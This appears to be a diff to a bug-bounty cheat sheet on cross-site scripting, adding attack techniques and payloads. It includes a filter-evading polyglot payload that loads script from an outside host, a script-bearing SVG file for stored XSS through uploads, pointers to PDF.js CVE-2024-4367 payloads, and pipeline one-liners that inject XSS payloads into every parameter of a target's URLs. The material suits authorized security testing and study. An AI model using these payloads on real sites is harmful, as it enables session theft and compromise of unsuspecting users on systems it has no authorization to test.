@@ -846,6 +846,56 @@ alert("XSS");
 
 ```
 
+### Polygot
+It’s a malicious payload meant to cover all places of reflection (DOM, reflected XSS, stored XSS). Here’s an example by @KNOXSS:
+
+```javascript
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<! →</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=14564/.source))}//\76 →
+```
+Make sure to inject that everywhere you have an on-input simple trick. Inject your payloads on the HTTP request, not on the browser, to bypass JavaScript regex and filters.
+
+### Stored XSS by file upload
+save this script as ( image.svg ) and upload it on every file upload option , if successful , try to find the path of the image , if you open the link of the image and execute , congrats you got an stored xss
+
+```javascript
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('xss');
+   </script>
+</svg>
+```
+
+### Stored XSS on PDF.js CVE-2024–4367
+This particular CVE works on applications that use PDF.js, a PDF viewer. Here’s what you need to do:
+
+1. Whenever you see an app using this technology, upload a vulnerable PDF file
+2. If you see any reflection while opening the file, you’ve got a stored XSS!
+
+* [PDF Payloads](https://github.com/Mehdi0x90/Web_Hacking/blob/main/XSS-PDF%20Payloads/)
+
+
+###  Reflected XSS (Non-Persistent XSS)
+**Trick n°1:**
+
+You go and browse the app normally , make sure to click every button you find ( while burp proxy is on ) , then you go to burp history section and do scoop only select only request with parameter and go to the request one by one and inject your payload on these urls , there a high chance you will find a reflected XSS.
+
+**Trick n°2:**
+
+XSS one liner
+
+```javascript
+# method 1
+echo "target.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'
+
+# method 2
+echo "target.com" | waybackurls | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'
+```
+
+
 ## Automate XSS
 * [dalfox](https://github.com/hahwul/dalfox) - DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters
 ```bash
@@ -860,6 +910,7 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 * [XSSTRON](https://github.com/RenwaX23/XSSTRON) - Powerful Chromium Browser to find XSS Vulnerabilites automatically while browsing web, it can detect many case scenarios with support for POST requests too
 
 * [XSS-Radar](https://github.com/bugbountyforum/XSS-Radar) - XSS Radar is a tool that detects parameters and fuzzes them for cross-site scripting vulnerabilities
+* [KNOXSS Community Edition by Brute Logic](https://addons.mozilla.org/en-US/firefox/user/12642480/) - This tool it will scan every URL you visit from reflected XSS , if its vulnerable it will pop up an alert(1) box ( make sure to turn the extension ON ) to make sure it scanning .
 
 
 
